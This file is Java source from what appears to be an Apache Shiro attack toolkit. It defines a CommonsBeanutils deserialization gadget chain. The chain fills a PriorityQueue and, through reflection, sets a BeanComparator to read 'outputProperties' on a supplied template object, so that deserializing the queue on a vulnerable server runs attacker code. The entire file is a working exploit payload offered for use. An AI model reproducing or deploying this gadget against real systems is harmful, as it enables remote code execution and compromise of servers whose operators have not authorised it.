package com.sma11new.exp.shiro.attack.payloads;

import cn.hutool.core.util.RandomUtil;
import com.sma11new.exp.shiro.attack.payloads.annotation.Authors;
import com.sma11new.exp.shiro.attack.payloads.annotation.Dependencies;
import com.sma11new.exp.shiro.attack.util.Reflections;
import org.apache.commons.beanutils.BeanComparator;

import java.util.PriorityQueue;
import java.util.Queue;

@Dependencies(value={"commons-beanutils:commons-beanutils:1.8.3"})
@Authors(value={"phith0n"})
public class CommonsBeanutilsString
implements ObjectPayload<Queue<Object>> {
    @Override
    public Queue<Object> getObject(Object template) throws Exception {
        BeanComparator beanComparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, beanComparator);
        String baseString = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        String pass = RandomUtil.randomString(baseString, 2);
        queue.add(pass);
        queue.add(pass);
        Reflections.setFieldValue(queue, "queue", new Object[]{template, template});
        Reflections.setFieldValue(beanComparator, "property", "outputProperties");
        return queue;
    }
}

